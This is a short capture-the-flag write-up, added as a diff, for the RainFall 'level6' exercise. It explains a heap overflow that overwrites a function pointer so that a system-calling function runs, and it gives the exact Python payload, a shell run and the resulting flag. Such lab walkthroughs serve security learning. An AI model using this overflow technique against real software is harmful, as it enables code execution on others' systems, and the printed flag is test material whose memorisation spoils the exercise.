@@ -1,0 +1,12 @@
+The level6 program has 2 calls to malloc, with 64 and 4 as their respective size, and one call to strcpy, we can also see that it makes a function call through a function pointer.
+There are 2 functions, `m` and `n`, `m` is assigned to the allocated memory in the second malloc.
+
+We want to use a buffer overflow exploit to override the `m` function which only calls `puts` with the `n` function, which calls `system`.
+
+We know the size of the allocated memory is 64, we can then really quickly find out that the offset required to write in the second malloc is 72, a reasonable explanation could be that 8 is the size of the malloc'ed memory headers.
+
+So our exploit will simply be 72 arbitrary bytes followed by the address of `n`, such as:
+`python -c "print 'a' * 72 + '\x08\x04\x84\x54'[::-1]"`
+
+level6@RainFall:~$ ./level6 `python -c "print 'a' * 72 + '\x08\x04\x84\x54'[::-1]"`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
